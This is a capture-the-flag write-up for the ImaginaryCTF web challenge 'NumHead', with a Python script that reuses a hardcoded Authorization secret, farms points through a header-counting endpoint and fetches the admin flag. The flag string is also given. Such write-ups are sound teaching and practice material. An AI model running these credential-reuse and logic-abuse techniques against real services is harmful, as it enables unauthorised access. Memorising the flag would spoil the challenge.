# NumHead

## Task

[NumHead.zip](https://imaginaryctf.org/r/BF80-NumHead.zip)

## Solution

We are given the code to the full api, so
we just script a little bit of the interactions.

First we need to log in, we do that by using
the `/api/user/new_token` with an Authorization header
containing `0nlyL33tHax0rsAll0w3d` (Set in the config.py file).

so we get our token by doing

`uid = s.post(f"{base}/api/user/new-token", headers={"Authorization": "0nlyL33tHax0rsAll0w3d"}).json()["id"]`


afterwards we need to get to 1000 points. We could play the game...
Or we could just use the `/api/user/nothing-here` endpoint which just
checks if you have new headers in your request. We can modify those
headers quite easily by just adding a new element to a dict in python
and sending that. So we just do that 10 times to get a total of 1000 points
and then call the `/api/admin/flag` endpoint to get the flag

Full Solve script:
```python
from requests import Session
from time import sleep

s = Session()

base = "http://localhost:8080"
base = "https://numhead.chal.imaginaryctf.org"

def get_points():
    sleep(1)
    return s.get(f"{base}/api/user/points", headers={"Authorization": uid}).text

uid = s.post(f"{base}/api/user/new-token", headers={"Authorization": "0nlyL33tHax0rsAll0w3d"}).json()["id"]
print(get_points())
headers = {"Authorization": uid}
for i in range(10):
    headers[f"kek{i}"] = "kek"
    sleep(1)
    x = s.post(f"{base}/api/user/nothing-here", headers=headers)
    print(x.text)
print(get_points())
sleep(1)
x = s.get(f"{base}/api/admin/flag", headers={"Authorization": uid})
print(x.text)
```

I had to put in some sleeps due to rate limiting.

`ictf{b3aT_tH3_g@Me_???}`

